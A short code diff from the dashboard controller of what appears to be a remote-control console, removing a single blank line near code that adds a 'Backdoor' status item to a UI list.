@@ -61,7 +61,6 @@ package it.ht.rcs.console.dashboard.controller
       addItem({name: 'Backdoor', status: 'queued', _kind: 'backdoor'});
     }
     
- 
     public function newDashItem(id:String, callback:Function):void
     {     
       _dashboard_ids.addItem(id);
